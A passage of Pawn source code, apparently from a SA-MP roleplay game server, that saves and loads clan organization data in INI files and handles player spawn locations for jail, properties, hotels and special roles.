	INI_WriteString( File, "Clan23", OI[ id ][ oClan23 ] );
	INI_WriteString( File, "Clan24", OI[ id ][ oClan24 ] );
	INI_WriteString( File, "Clan25", OI[ id ][ oClan25 ] );
	INI_WriteString( File, "Clan26", OI[ id ][ oClan26 ] );
	INI_WriteString( File, "Clan27", OI[ id ][ oClan27 ] );
	INI_WriteString( File, "Clan28", OI[ id ][ oClan28 ] );
	INI_WriteString( File, "Clan29", OI[ id ][ oClan29 ] );
	INI_WriteString( File, "Clan30", OI[ id ][ oClan30 ] );

	INI_WriteString( File, "Rank1", OI[ id ][ oRank1 ] );
	INI_WriteString( File, "Rank2", OI[ id ][ oRank2 ] );
	INI_WriteString( File, "Rank3", OI[ id ][ oRank3 ] );
	INI_WriteString( File, "Rank4", OI[ id ][ oRank4 ] );
	INI_WriteString( File, "Rank5", OI[ id ][ oRank5 ] );
	INI_WriteString( File, "Rank6", OI[ id ][ oRank6 ] );

	INI_WriteFloat( File, "PozExtX", OI[ id ][ oPozExtX ] );
	INI_WriteFloat( File, "PozExtY", OI[ id ][ oPozExtY ] );
	INI_WriteFloat( File, "PozExtZ", OI[ id ][ oPozExtZ ] );

	INI_WriteFloat( File, "PozIntX", OI[ id ][ oPozIntX ] );
	INI_WriteFloat( File, "PozIntY", OI[ id ][ oPozIntY ] );
	INI_WriteFloat( File, "PozIntZ", OI[ id ][ oPozIntZ ] );

	INI_WriteFloat( File, "DutyPoint1", OI[ id ][ oDutyPoint ][ 0 ] );
    INI_WriteFloat( File, "DutyPoint2", OI[ id ][ oDutyPoint ][ 1 ] );
    INI_WriteFloat( File, "DutyPoint3", OI[ id ][ oDutyPoint ][ 2 ] );

    INI_WriteInt( File, "DutyInt", OI[ id ][ oDutyInt ] );
	INI_WriteInt( File, "DutyVW", OI[ id ][ oDutyVW ] );

    INI_WriteFloat( File, "EquipPoint1", OI[ id ][ oEquipPoint ][ 0 ] );
    INI_WriteFloat( File, "EquipPoint2", OI[ id ][ oEquipPoint ][ 1 ] );
    INI_WriteFloat( File, "EquipPoint3", OI[ id ][ oEquipPoint ][ 2 ] );

	INI_WriteInt( File, "EquipInt", OI[ id ][ oEquipInt ] );
	INI_WriteInt( File, "EquipVW", OI[ id ][ oEquipVW ] );

    INI_WriteInt( File, "MaxPort", OI[ id ][ oMaxPort ] );
    INI_WriteInt( File, "ControlType", OI[ id ][ oControlType ] );
    INI_WriteFloat( File, "DrugField1", OI[ id ][ oDrugField ][ 0 ] );
    INI_WriteFloat( File, "DrugField2", OI[ id ][ oDrugField ][ 1 ] );
    INI_WriteFloat( File, "DrugField3", OI[ id ][ oDrugField ][ 2 ] );
    INI_WriteFloat( File, "SafePos1", OI[ id ][ oSafePos ][ 0 ] );
    INI_WriteFloat( File, "SafePos2", OI[ id ][ oSafePos ][ 1 ] );
    INI_WriteFloat( File, "SafePos3", OI[ id ][ oSafePos ][ 2 ] );
    
    INI_WriteInt( File, "SafeMoney", OI[ id ][ oSafeMoney ] );
    INI_WriteInt( File, "Materijali", OI[id][oMaterijali]);
    INI_WriteInt( File, "SafeDrug1", OI[ id ][ oSafeDrug ][ 0 ] );
    INI_WriteInt( File, "SafeDrug2", OI[ id ][ oSafeDrug ][ 1 ] );
    INI_WriteInt( File, "SafeDrug3", OI[ id ][ oSafeDrug ][ 2 ] );
    INI_WriteInt( File, "SafeDrug4", OI[ id ][ oSafeDrug ][ 3 ] );
    INI_WriteInt( File, "SafeDrugCode1", OI[ id ][ oSafeDrugCode ][ 0 ] );
    INI_WriteInt( File, "SafeDrugCode2", OI[ id ][ oSafeDrugCode ][ 1 ] );
    INI_WriteInt( File, "SafeDrugCode3", OI[ id ][ oSafeDrugCode ][ 2 ] );
    INI_WriteInt( File, "SafeDrugCode4", OI[ id ][ oSafeDrugCode ][ 3 ] );

	INI_WriteInt( File, "Int", OI[ id ][ oInt ] );
	INI_WriteInt( File, "Vw", OI[ id ][ oVw ] );

    INI_WriteInt( File, "PobedjeniWar", OI[id][oPobedjeniWar]);
    INI_WriteInt( File, "Savez", OI[id][oSavez]);

    INI_WriteFloat( File, "SlabaTackaX", OI[id][oSlabaTacka][0]);
    INI_WriteFloat( File, "SlabaTackaY", OI[id][oSlabaTacka][1]);
    INI_WriteFloat( File, "SlabaTackaZ", OI[id][oSlabaTacka][2]);

    INI_WriteBool(File, "SlabaTackaProbijena", OI[id][oSlabaTackaProbijena]);

    INI_WriteBool(File, "Orobano", OI[id][oOrobano]);

	INI_Close( File );
	return 1;
}
forward LoadPorts(id, name[], value[] );
public LoadPorts(id, name[], value[]) {
	new string[ 15 ];

    for( new i = 0; i < OI[ id ][ oMaxPort ]; i++) {

	    format( string, sizeof( string ), "Pos1X%d", i );
		INI_Float( string, PortOP[ id ][ i ][ Pos1 ][ 0 ] );

		format( string, sizeof( string ), "Pos1Y%d", i );
		INI_Float( string, PortOP[ id ][ i ][ Pos1 ][ 1 ] );

		format( string, sizeof( string ), "Pos1Z%d", i );
		INI_Float( string, PortOP[ id ][ i ][ Pos1 ][ 2 ] );

		format( string, sizeof( string ), "Int1%d", i );
		INI_Int( string, PortOP[ id ][ i ][ Int ][ 0 ] );

		format( string, sizeof( string ), "VW1%d", i );
		INI_Int( string, PortOP[ id ][ i ][ VW ][ 0 ] );

        format( string, sizeof( string ), "Pos2X%d", i );
		INI_Float( string, PortOP[ id ][ i ][ Pos2 ][ 0 ] );

		format( string, sizeof( string ), "Pos2Y%d", i );
		INI_Float( string, PortOP[ id ][ i ][ Pos2 ][ 1 ] );

		format( string, sizeof( string ), "Pos2Z%d", i );
		INI_Float( string, PortOP[ id ][ i ][ Pos2 ][ 2 ] );

		format( string, sizeof( string ), "Int2%d", i );
		INI_Int( string, PortOP[ id ][ i ][ Int ][ 1 ] );

		format( string, sizeof( string ), "VW2%d", i );
		INI_Int( string, PortOP[ id ][ i ][ VW ][ 1 ] );

    }
    return 1;
}
//------------------------------------------------------------------------------
public UcitajOrganizaciju(id, name[], value[])
{
    INI_Int( "ID", OI[ id ][ oID ] );
	INI_String( "Ime", OI[ id ][ oName ], ORG_IME );
	INI_String( "PreFix", OI[ id ][ oPreFix ], 10 );
	INI_String( "Color", OI[ id ][ oColor ], 24 );

	INI_Int( "Tip", OI[ id ][ oTip ] );
	INI_Int( "MaxClanova", OI[ id ][ oMaxClanova ] );
	INI_Int( "UbacenihClanova", OI[ id ][ oUbacenihClanova ] );

    INI_Int( "Skin1", OI[ id ][ oSkin1] );
	INI_Int( "Skin2", OI[ id ][ oSkin2] );
	INI_Int( "Skin3", OI[ id ][ oSkin3] );
	INI_Int( "Skin4", OI[ id ][ oSkin4] );
	INI_Int( "Skin5", OI[ id ][ oSkin5] );
	INI_Int( "Skin6", OI[ id ][ oSkin6] );
	
	INI_Int( "ZSkin1", OI[ id ][ oZSkin1] );
	INI_Int( "ZSkin2", OI[ id ][ oZSkin2] );
	INI_Int( "ZSkin3", OI[ id ][ oZSkin3] );
	INI_Int( "ZSkin4", OI[ id ][ oZSkin4] );
	INI_Int( "ZSkin5", OI[ id ][ oZSkin5] );
	INI_Int( "ZSkin6", OI[ id ][ oZSkin6] );

	INI_String( "Lider1", OI[ id ][ oLider1 ], ORG_LIDER );
    INI_String( "Lider2", OI[ id ][ oLider2 ], ORG_LIDER );

	INI_String( "Clan1", OI[ id ][ oClan1 ], ORG_CLAN );
	INI_String( "Clan2", OI[ id ][ oClan2 ], ORG_CLAN );
	INI_String( "Clan3", OI[ id ][ oClan3 ], ORG_CLAN );
	INI_String( "Clan4", OI[ id ][ oClan4 ], ORG_CLAN );
	INI_String( "Clan5", OI[ id ][ oClan5 ], ORG_CLAN );
	INI_String( "Clan6", OI[ id ][ oClan6 ], ORG_CLAN );
	INI_String( "Clan7", OI[ id ][ oClan7 ], ORG_CLAN );
	INI_String( "Clan8", OI[ id ][ oClan8 ], ORG_CLAN );
	INI_String( "Clan9", OI[ id ][ oClan9 ], ORG_CLAN );
	INI_String( "Clan10", OI[ id ][ oClan10 ], ORG_CLAN );
	INI_String( "Clan11", OI[ id ][ oClan11 ], ORG_CLAN );
	INI_String( "Clan12", OI[ id ][ oClan12 ], ORG_CLAN );
	INI_String( "Clan13", OI[ id ][ oClan13 ], ORG_CLAN );
	INI_String( "Clan14", OI[ id ][ oClan14 ], ORG_CLAN );
	INI_String( "Clan15", OI[ id ][ oClan15 ], ORG_CLAN );
	INI_String( "Clan16", OI[ id ][ oClan16 ], ORG_CLAN );
	INI_String( "Clan17", OI[ id ][ oClan17 ], ORG_CLAN );
	INI_String( "Clan18", OI[ id ][ oClan18 ], ORG_CLAN );
	INI_String( "Clan19", OI[ id ][ oClan19 ], ORG_CLAN );
	INI_String( "Clan20", OI[ id ][ oClan20 ], ORG_CLAN );
	INI_String( "Clan21", OI[ id ][ oClan21 ], ORG_CLAN );
	INI_String( "Clan22", OI[ id ][ oClan22 ], ORG_CLAN );
	INI_String( "Clan23", OI[ id ][ oClan23 ], ORG_CLAN );
	INI_String( "Clan24", OI[ id ][ oClan24 ], ORG_CLAN );
	INI_String( "Clan25", OI[ id ][ oClan25 ], ORG_CLAN );
	INI_String( "Clan26", OI[ id ][ oClan26 ], ORG_CLAN );
	INI_String( "Clan27", OI[ id ][ oClan27 ], ORG_CLAN );
	INI_String( "Clan28", OI[ id ][ oClan28 ], ORG_CLAN );
	INI_String( "Clan29", OI[ id ][ oClan29 ], ORG_CLAN );
	INI_String( "Clan30", OI[ id ][ oClan30 ], ORG_CLAN );

	INI_String( "Rank1", OI[ id ][ oRank1], ORG_RANK);
	INI_String( "Rank2", OI[ id ][ oRank2], ORG_RANK);
	INI_String( "Rank3", OI[ id ][ oRank3], ORG_RANK);
	INI_String( "Rank4", OI[ id ][ oRank4], ORG_RANK);
	INI_String( "Rank5", OI[ id ][ oRank5], ORG_RANK);
	INI_String( "Rank6", OI[ id ][ oRank6], ORG_RANK);

	INI_Float( "PozExtX", OI[ id ][ oPozExtX] );
	INI_Float( "PozExtY", OI[ id ][ oPozExtY] );
	INI_Float( "PozExtZ", OI[ id ][ oPozExtZ] );

	INI_Float( "PozIntX", OI[ id ][ oPozIntX] );
	INI_Float( "PozIntY", OI[ id ][ oPozIntY] );
	INI_Float( "PozIntZ", OI[ id ][ oPozIntZ] );

	INI_Float( "DutyPoint1", OI[ id ][ oDutyPoint ][ 0 ] );
    INI_Float( "DutyPoint2", OI[ id ][ oDutyPoint ][ 1 ] );
    INI_Float( "DutyPoint3", OI[ id ][ oDutyPoint ][ 2 ] );

    INI_Int( "DutyInt", OI[ id ][ oDutyInt ] );
	INI_Int( "DutyVW", OI[ id ][ oDutyVW ] );

    INI_Float( "EquipPoint1", OI[ id ][ oEquipPoint ][ 0 ] );
    INI_Float( "EquipPoint2", OI[ id ][ oEquipPoint ][ 1 ] );
    INI_Float( "EquipPoint3", OI[ id ][ oEquipPoint ][ 2 ] );

    INI_Int( "EquipInt", OI[ id ][ oEquipInt ] );
	INI_Int( "EquipVW", OI[ id ][ oEquipVW ] );

    INI_Int( "MaxPort", OI[ id ][ oMaxPort ] );
    INI_Int( "ControlType", OI[ id ][ oControlType ] );
    INI_Float( "DrugField1", OI[ id ][ oDrugField ][ 0 ] );
    INI_Float( "DrugField2", OI[ id ][ oDrugField ][ 1 ] );
    INI_Float( "DrugField3", OI[ id ][ oDrugField ][ 2 ] );
    INI_Float( "SafePos1", OI[ id ][ oSafePos ][ 0 ] );
    INI_Float( "SafePos2", OI[ id ][ oSafePos ][ 1 ] );
    INI_Float( "SafePos3", OI[ id ][ oSafePos ][ 2 ] );
    
    INI_Int( "SafeMoney", OI[ id ][ oSafeMoney ] );
    INI_Int("Materijali", OI[id][oMaterijali]);
    INI_Int( "SafeDrug1", OI[ id ][ oSafeDrug ][ 0 ] );
    INI_Int( "SafeDrug2", OI[ id ][ oSafeDrug ][ 1 ] );
    INI_Int( "SafeDrug3", OI[ id ][ oSafeDrug ][ 2 ] );
    INI_Int( "SafeDrug4", OI[ id ][ oSafeDrug ][ 3 ] );
    INI_Int( "SafeDrugCode1", OI[ id ][ oSafeDrugCode ][ 0 ] );
    INI_Int( "SafeDrugCode2", OI[ id ][ oSafeDrugCode ][ 1 ] );
    INI_Int( "SafeDrugCode3", OI[ id ][ oSafeDrugCode ][ 2 ] );
    INI_Int( "SafeDrugCode4", OI[ id ][ oSafeDrugCode ][ 3 ] );

	INI_Int( "Int", OI[ id ][ oInt] );
	INI_Int( "Vw", OI[ id ][ oVw ] );

    INI_Int("PobedjeniWar", OI[id][oPobedjeniWar]);
    INI_Int("Savez", OI[id][oSavez]);

    INI_Float("SlabaTackaX", OI[id][oSlabaTacka][0]);
    INI_Float("SlabaTackaY", OI[id][oSlabaTacka][1]);
    INI_Float("SlabaTackaZ", OI[id][oSlabaTacka][2]);

    INI_Bool("SlabaTackaProbijena", OI[id][oSlabaTackaProbijena]);
    INI_Bool("Orobano", OI[id][oOrobano]);

	return 1;
}
//------------------------------------------------------------------------------
public SlobodnoSada( playerid ) {
	if( PlayerCP[ playerid ] == 0 )
    	TogglePlayerControllable( playerid, true );
}
//------------------------------------------------------------------------------
forward IzlecenOdZavisnosti( playerid );
public IzlecenOdZavisnosti( playerid ) {
	Novi_KillTimer( BolnicaTimer[ playerid ] );

 	TogglePlayerControllable( playerid, true );
	SetPlayerInterior( playerid, 0 );
	SetPlayerVirtualWorld( playerid, 0 );
	Novi_SetPlayerPos( playerid, 1186.4130, -1317.1139, 13.5574 );
	SetCameraBehindPlayer( playerid );

    VremeTDControl( playerid, false );

	SCM( playerid, SVETLOPLAVA, "[Doktor]: {FFFFFF}Izlecili smo vasu zavisnost 25000$ | Prijatan dan." );
	return 1;
}
//------------------------------------------------------------------------------
public PostaviSpawn( playerid )
{
    new OrgID = PlayerInfo[ playerid ][ xClan ];
    if( IsPlayerConnected( playerid ) ) {
	    if( PlayerInfo[ playerid ][ xUbijen ] == 1 ) {
	    
	        new rand = random( sizeof( RandomLSSpawn1 ) );
            Novi_SetPlayerPos( playerid, RandomLSSpawn1[ rand ][ 0 ], RandomLSSpawn1[ rand ][ 1 ],RandomLSSpawn1[ rand ][ 2 ] );
            SetPlayerFacingAngle( playerid, 360.000 );
            SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
            GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
            TogglePlayerControllable( playerid, false );
            SetCameraBehindPlayer( playerid );
            SetPlayerInterior( playerid, 0 );

            PlayerInfo[playerid][xUbijen] = 0;

		}
		else {
		
		    if( PlayerInfo[ playerid ][ xZatvor ] == OBICAN_ZATVOR )
			{
			    new rand = random( sizeof( RandomZatvor ) );
				Novi_SetPlayerPos( playerid, RandomZatvor[ rand ][ 0 ], RandomZatvor[ rand ][ 1 ],RandomZatvor[ rand ][ 2 ] );
                SetPlayerWorldBounds(playerid, -1398.697143, -1472.672607, -1443.334228, -1605.534057);
				SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
				GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
				TogglePlayerControllable( playerid, false );
				SCM( playerid, CRVENA, "Nedovrsena zatvorska kazna, natrag u zatvor.");
				SetCameraBehindPlayer( playerid );
				SetPlayerInterior( playerid, 0 );
				SetPlayerVirtualWorld( playerid, 0 );

			}
			else if( PlayerInfo[ playerid ][ xZatvor ] == ALKATRAZ )
			{
				new rand = random(sizeof(RandomPrison));
                Novi_SetPlayerPos(playerid, RandomPrison[ rand ][ 0 ], RandomPrison[ rand ][ 1 ],RandomPrison[ rand ][ 2 ] );
				SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
				GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
				TogglePlayerControllable( playerid, false );
				SCM( playerid, CRVENA, "Nedovrsena zatvorska kazna, natrag u Area51.");
				SetCameraBehindPlayer( playerid );
				SetPlayerInterior( playerid, 0 );
				SetPlayerVirtualWorld( playerid, 1 );
				SetPlayerWorldBounds( playerid, 3146.996582, 2866.935546, -2706.383789, -3017.336669 );

			}
			else {
			
			    if( PlayerInfo[ playerid ][ xSpawn ] == SPAWN_ADMIN ) {
				    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSupporter ] >= 1 ) {
						Novi_SetPlayerPos( playerid, -193.3436, 2285.2844, 108.3361 );
						SetPlayerFacingAngle( playerid, 360.000 );
						SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
						GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
						TogglePlayerControllable( playerid, false );
						SetCameraBehindPlayer( playerid );
						SetPlayerInterior( playerid, 0 );
					}
					else {
					    new rand = random( sizeof( RandomLSSpawn1 ) );
						Novi_SetPlayerPos( playerid, RandomLSSpawn1[ rand ][ 0 ], RandomLSSpawn1[ rand ][ 1 ], RandomLSSpawn1[ rand ][ 2 ] );
						SetPlayerFacingAngle( playerid, 360.000 );
						SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
						GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
						TogglePlayerControllable( playerid, false );
						SetCameraBehindPlayer( playerid );
						SetPlayerInterior( playerid, 0 );
						PlayerInfo[ playerid ][ xSpawn ] = SPAWN_OBICAN_LS_1;
					}
				}
			    else if( PlayerInfo[ playerid ][ xSpawn ] == SPAWN_OBICAN_LS_1 ) {
			        new rand = random( sizeof( RandomLSSpawn1 ) );
					Novi_SetPlayerPos( playerid, RandomLSSpawn1[ rand ][ 0 ], RandomLSSpawn1[ rand ][ 1 ],RandomLSSpawn1[ rand ][ 2 ] );
					SetPlayerFacingAngle( playerid, 360.000 );
					SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
					GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
					TogglePlayerControllable( playerid, false );
					SetCameraBehindPlayer( playerid );
					SetPlayerInterior( playerid, 0 );
				}
			    else if( PlayerInfo[ playerid ][ xSpawn ] == SPAWN_BAZA ) {
					Novi_SetPlayerPos( playerid, OI[ OrgID ][ oPozIntX ], OI[ OrgID ][ oPozIntY ] , OI[ OrgID ][ oPozIntZ ] );
					SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
					GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
					TogglePlayerControllable( playerid, false );
					SetCameraBehindPlayer( playerid );
					SetPlayerInterior( playerid, OI[ OrgID ][ oInt ] );
					SetPlayerVirtualWorld( playerid, OI[ OrgID ][ oVw ] );
					inOrgInt[ playerid ] = OrgID;
				}
				else if( PlayerInfo[ playerid ][ xSpawn ] == SPAWN_IMOVINA_1 ) {
					if( PlayerInfo[ playerid ][ xProperty ][ 0 ] != -1 ) {
					    new i = PlayerInfo[ playerid ][ xProperty ][ 0 ];

					    Novi_SetPlayerPos( playerid, II[ i ][ iExit ][ 0 ], II[ i ][ iExit ][ 1 ], II[ i ][ iExit ][ 2 ] );
				  		GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
					    SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
					    SetCameraBehindPlayer( playerid );
				        TogglePlayerControllable( playerid, false );
				    	SetPlayerInterior( playerid, II[ i ][ iInterior ] );
						SetPlayerVirtualWorld( playerid, II[ i ][ iVW ] );
						inProperty[ playerid ] = i;
					}
					else {
					    new rand = random( sizeof( RandomLSSpawn1 ) );
						Novi_SetPlayerPos( playerid, RandomLSSpawn1[ rand ][ 0 ], RandomLSSpawn1[ rand ][ 1 ],RandomLSSpawn1[ rand ][ 2 ] );
						SetPlayerFacingAngle( playerid, 360.000 );
						SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
						GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
						TogglePlayerControllable( playerid, false );
						SetCameraBehindPlayer( playerid );
						SetPlayerInterior( playerid, 0 );
						PlayerInfo[ playerid ][ xSpawn ] = SPAWN_OBICAN_LS_1;
					}

				}
				else if( PlayerInfo[ playerid ][ xSpawn ] == SPAWN_IMOVINA_2 ) {
				    if( PlayerInfo[ playerid ][ xProperty ][ 1 ] != -1 ) {
					    new i = PlayerInfo[ playerid ][ xProperty ][ 1 ];

					    Novi_SetPlayerPos( playerid, II[ i ][ iExit ][ 0 ], II[ i ][ iExit ][ 1 ], II[ i ][ iExit ][ 2 ] );
				  		GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
					    SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
					    SetCameraBehindPlayer( playerid );
				        TogglePlayerControllable( playerid, false );
				    	SetPlayerInterior( playerid, II[ i ][ iInterior ] );
						SetPlayerVirtualWorld( playerid, II[ i ][ iVW ] );
						inProperty[ playerid ] = i;
					}
					else {
					    new rand = random( sizeof( RandomLSSpawn1 ) );
						Novi_SetPlayerPos( playerid, RandomLSSpawn1[ rand ][ 0 ], RandomLSSpawn1[ rand ][ 1 ],RandomLSSpawn1[ rand ][ 2 ] );
						SetPlayerFacingAngle( playerid, 360.000 );
						SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
						GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
						TogglePlayerControllable( playerid, false );
						SetCameraBehindPlayer( playerid );
						SetPlayerInterior( playerid, 0 );
						PlayerInfo[ playerid ][ xSpawn ] = SPAWN_OBICAN_LS_1;
					}

				}
				else if( PlayerInfo[ playerid ][ xSpawn ] == SPAWN_IMOVINA_3 ) {
				    if( PlayerInfo[ playerid ][ xProperty ][ 2 ] != -1 ) {
					    new i = PlayerInfo[ playerid ][ xProperty ][ 2 ];

					    Novi_SetPlayerPos( playerid, II[ i ][ iExit ][ 0 ], II[ i ][ iExit ][ 1 ], II[ i ][ iExit ][ 2 ] );
				  		GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
					    SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
					    SetCameraBehindPlayer( playerid );
				        TogglePlayerControllable( playerid, false );
				    	SetPlayerInterior( playerid, II[ i ][ iInterior ] );
						SetPlayerVirtualWorld( playerid, II[ i ][ iVW ] );
						inProperty[ playerid ] = i;
					}
					else {
					    new rand = random( sizeof( RandomLSSpawn1 ) );
						Novi_SetPlayerPos( playerid, RandomLSSpawn1[ rand ][ 0 ], RandomLSSpawn1[ rand ][ 1 ],RandomLSSpawn1[ rand ][ 2 ] );
						SetPlayerFacingAngle( playerid, 360.000 );
						SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
						GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
						TogglePlayerControllable( playerid, false );
						SetCameraBehindPlayer( playerid );
						SetPlayerInterior( playerid, 0 );
						PlayerInfo[ playerid ][ xSpawn ] = SPAWN_OBICAN_LS_1;
					}

				}
				else if( PlayerInfo[ playerid ][ xSpawn ] == SPAWN_BELAKUCA ) {
			        Novi_SetPlayerPos( playerid, 1292.5704, -832.4692, 1085.6328 );
					SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
					GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
					TogglePlayerControllable( playerid, false );
					SetCameraBehindPlayer( playerid );
					SetPlayerInterior( playerid, 5 );
					SetPlayerVirtualWorld( playerid, 0 );
				}
				else if( PlayerInfo[ playerid ][ xSpawn ] == SPAWN_OBICAN_LS_2 ) {
			        new rand = random( sizeof( RandomLSSpawn2 ) );
					Novi_SetPlayerPos( playerid, RandomLSSpawn2[ rand ][ 0 ], RandomLSSpawn2[ rand ][ 1 ],RandomLSSpawn2[ rand ][ 2 ] );
					SetPlayerFacingAngle( playerid, 360.000 );
					SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
					GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
					TogglePlayerControllable( playerid, false );
					SetCameraBehindPlayer( playerid );
					SetPlayerInterior( playerid, 0 );
				}
				else if( PlayerInfo[ playerid ][ xSpawn ] == SPAWN_OBICAN_SF ) {
			        new rand = random( sizeof( RandomSFSpawn ) );
					Novi_SetPlayerPos( playerid, RandomSFSpawn[ rand ][ 0 ], RandomSFSpawn[ rand ][ 1 ],RandomSFSpawn[ rand ][ 2 ] );
					SetPlayerFacingAngle( playerid, 360.000 );
					SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
					GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
					TogglePlayerControllable( playerid, false );
					SetCameraBehindPlayer( playerid );
					SetPlayerInterior( playerid, 0 );
				}
				else if( PlayerInfo[ playerid ][ xSpawn ] == SPAWN_RENTHOTEL ) {
					if( PlayerInfo[ playerid ][ xHotelRoom ] != -1 ) {
					    new i = PlayerInfo[ playerid ][ xHotelRoom ];

                        if( strcmp( ImeIgraca( playerid ), hotelInfo[ i ][ hGuest_1 ], true ) == 0) {
					    	Novi_SetPlayerPos( playerid, 2246.6826, -1160.8252, 1029.7969 );
						}
						else if( strcmp( ImeIgraca( playerid ), hotelInfo[ i ][ hGuest_2 ], true ) == 0) {
					    	Novi_SetPlayerPos( playerid, 2235.9670, -1158.5640, 1029.7969 );
						}
						else if( strcmp( ImeIgraca( playerid ), hotelInfo[ i ][ hGuest_3 ], true ) == 0) {
					    	Novi_SetPlayerPos( playerid, 2235.7524, -1169.7406, 1029.8043 );
						}
						else if( strcmp( ImeIgraca( playerid ), hotelInfo[ i ][ hGuest_4 ], true ) == 0) {
					    	Novi_SetPlayerPos( playerid, 2227.1511, -1182.9784, 1029.8043 );
						}
						else if( strcmp( ImeIgraca( playerid ), hotelInfo[ i ][ hGuest_5 ], true ) == 0) {
					    	Novi_SetPlayerPos( playerid, 2207.9285, -1194.5630, 1029.7969 );
						}
						else if( strcmp( ImeIgraca( playerid ), hotelInfo[ i ][ hGuest_6 ], true ) == 0) {
					    	Novi_SetPlayerPos( playerid, 2198.8984, -1174.5468, 1029.8043 );
						}
						else if( strcmp( ImeIgraca( playerid ), hotelInfo[ i ][ hGuest_7 ], true ) == 0) {
					    	Novi_SetPlayerPos( playerid, 2188.1833, -1155.7197, 1029.7969 );
						}
						else if( strcmp( ImeIgraca( playerid ), hotelInfo[ i ][ hGuest_8 ], true ) == 0) {
					    	Novi_SetPlayerPos( playerid, 2198.7791, -1158.6515, 1029.7969 );
						}
						else if( strcmp( ImeIgraca( playerid ), hotelInfo[ i ][ hGuest_9 ], true ) == 0) {
					    	Novi_SetPlayerPos( playerid, 2188.1833, -1155.7197, 1029.7969 );
						}
						else if( strcmp( ImeIgraca( playerid ), hotelInfo[ i ][ hGuest_10 ], true ) == 0) {
					    	Novi_SetPlayerPos( playerid, 2198.7791, -1158.6515, 1029.7969 );
						}
						else {
						    PlayerInfo[ playerid ][ xHotelRoom ] = -1;
			         		SCM( playerid, SVETLOPLAVA, "* Iseljeni ste iz hotela!");
			         		new rand = random( sizeof( RandomLSSpawn1 ) );
							Novi_SetPlayerPos( playerid, RandomLSSpawn1[ rand ][ 0 ], RandomLSSpawn1[ rand ][ 1 ],RandomLSSpawn1[ rand ][ 2 ] );
							SetPlayerFacingAngle( playerid, 360.000 );
							SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
							GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
							TogglePlayerControllable( playerid, false );
							SetCameraBehindPlayer( playerid );
							SetPlayerInterior( playerid, 0 );
							PlayerInfo[ playerid ][ xSpawn ] = SPAWN_OBICAN_LS_1;
						    return 1;
						}

						GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
						SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
						SetCameraBehindPlayer( playerid );
						TogglePlayerControllable( playerid, false );
				    	SetPlayerInterior( playerid, hotelInfo[ i ][ hInterior ] );
						SetPlayerVirtualWorld( playerid, hotelInfo[ i ][ hVW ] );
						inHotel[ playerid ] = i;
					}
					else {
					    new rand = random( sizeof( RandomLSSpawn1 ) );
						Novi_SetPlayerPos( playerid, RandomLSSpawn1[ rand ][ 0 ], RandomLSSpawn1[ rand ][ 1 ], RandomLSSpawn1[ rand ][ 2 ] );
						SetPlayerFacingAngle( playerid, 360.000 );
						SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
						GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
						TogglePlayerControllable( playerid, false );
						SetCameraBehindPlayer( playerid );
						SetPlayerInterior( playerid, 0 );
						PlayerInfo[ playerid ][ xSpawn ] = SPAWN_OBICAN_LS_1;
					}

				}
				else if( PlayerInfo[ playerid ][ xSpawn ] == SPAWN_PROMOTER ) {
				    if( PlayerInfo[ playerid ][ xPromoter ] >= 1 ) {
						Novi_SetPlayerPos( playerid, 893.6500, -1635.7056, 14.9297 );
						SetPlayerFacingAngle( playerid, 360.000 );
						SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
						GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
						TogglePlayerControllable( playerid, false );
						SetCameraBehindPlayer( playerid );
						SetPlayerInterior( playerid, 0 );
					}
					else {
					    new rand = random( sizeof( RandomLSSpawn1 ) );
						Novi_SetPlayerPos( playerid, RandomLSSpawn1[ rand ][ 0 ], RandomLSSpawn1[ rand ][ 1 ], RandomLSSpawn1[ rand ][ 2 ] );
						SetPlayerFacingAngle( playerid, 360.000 );
						SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
						GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
						TogglePlayerControllable( playerid, false );
						SetCameraBehindPlayer( playerid );
						SetPlayerInterior( playerid, 0 );
						PlayerInfo[ playerid ][ xSpawn ] = SPAWN_OBICAN_LS_1;
					} 
				}
                else if( PlayerInfo[ playerid ][ xSpawn ] == SPAWN_RENT ) {
					if( PlayerInfo[ playerid ][ xRentID ] != -1 ) {
